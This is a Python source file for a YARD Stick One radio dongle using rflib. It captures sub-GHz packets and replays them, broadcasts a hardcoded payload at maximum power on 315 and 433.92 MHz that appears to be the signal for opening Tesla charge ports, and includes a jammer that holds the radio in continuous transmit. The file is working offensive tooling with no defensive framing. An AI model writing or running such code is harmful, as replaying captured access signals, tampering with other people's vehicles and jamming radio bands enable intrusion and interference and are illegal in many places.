import threading, time
import tkinter as tk
from rflib import *

class yardstick_rx:
    def __init__(self, callback):
        self.signals = []
        self.stop_event = threading.Event()
        self.callback = callback

    def capture_signals(self, d):
        print("[*] Live Packet Capture: \n")
        try:
            while not self.stop_event.is_set():
                capture, _ = d.RFrecv(blocksize=200)
                cap = capture.hex()
                strength = int(d.getRSSI().hex(), 16)
                if cap.count('f') < 300 and cap.count('0') < 300 and strength < 200:
                    print(cap)
                    self.signals.append(cap)
                    capture = f"Signal: {cap}\nSignal Length: {len(cap)}\nRSSI: {strength}\n"
                    self.callback(tk.END, capture)
        except ChipconUsbTimeoutException:
            pass

    def stop_capture(self):
        self.stop_event.set()

    def reset_capture(self):
        self.stop_event.clear()
        self.signals = []

def transmit_signals(d, signals):
        for payload in signals:
            d.makePktFLEN(len(bytes.fromhex(payload)))
            d.RFxmit(bytes.fromhex(payload) + b'\x00\x00\x00\x00\x00\x00')
            time.sleep(.5)


def transmit_tesla(d):
    d.setFreq(315000000)
    d.setMdmDRate(2500)
    d.setMaxPower()
    d.RFxmit(b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80' * 5)
    d.setFreq(433920000)
    d.RFxmit(b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80' * 5)

def jammer(d):
    d.setModeTX()

def parse_import_file(file_path):
    payloads = []
    with open(file_path, 'r') as file:
        for line in file:
            if 'Frequency:' in line:
                frequency = line.split(':')[1].strip()
            elif 'Modulation:' in line:
                modulation = line.split(':')[1].strip()
            elif 'Payload:' in line:
                payload = line.split(':')[1].strip()
                payloads.append(payload)
    return frequency, modulation, payloads
